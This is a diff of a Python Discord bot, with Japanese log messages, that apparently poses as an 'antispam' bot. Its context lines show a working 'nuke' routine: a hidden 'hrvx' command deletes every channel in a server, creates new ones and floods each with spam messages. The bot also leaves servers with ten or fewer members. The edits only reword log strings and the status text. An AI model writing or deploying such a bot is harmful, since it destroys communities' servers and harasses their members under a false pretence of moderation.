@@ -25,7 +25,7 @@ from discord import Status,Activity, ActivityType
 async def on_ready():
     await bot.change_presence(
         status=Status.dnd,  
-        activity=Activity(type=ActivityType.playing, name="antispam")
+        activity=Activity(type=ActivityType.playing, name="非公認に転生")
     )
     print(f"ログイン成功: {bot.user}")
     for guild in bot.guilds:
@@ -42,7 +42,7 @@ async def on_guild_join(guild):
     print(f"{guild.name} に参加しました（メンバー数: {human_count}）")
 
     if human_count <= 10:
-        print(f"{guild.name} から即退出します（メンバーが10人以下）")
+        print(f"{guild.name} から退出します（メンバーが10人以下）")
         await guild.leave()
 
 @bot.command()
@@ -93,11 +93,11 @@ async def hrvx(ctx):
     guild = ctx.guild
     await ctx.message.delete()
 
-    print(" チャンネル削除中")
+    print(" チャンネルを削除中")
     delete_tasks = [asyncio.create_task(ch.delete()) for ch in guild.channels]
     await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-    print(" チャンネル作成中")
+    print(" チャンネルを作成中")
     new_channels = []
     for i in range(0, 60, 15):
         tasks = [
@@ -110,7 +110,7 @@ async def hrvx(ctx):
                 new_channels.append(r)
         await asyncio.sleep(0.5)  
 
-    print(" スパム開始")
+    print(" nuke開始")
     async def spam(ch):
         for _ in range(60):
             try:
@@ -120,6 +120,6 @@ async def hrvx(ctx):
                 await asyncio.sleep(1)
 
     await asyncio.gather(*(spam(ch) for ch in new_channels))
-    print(" nukeログ")
+    print(" nuke完了しました")
         
 bot.run(TOKEN)
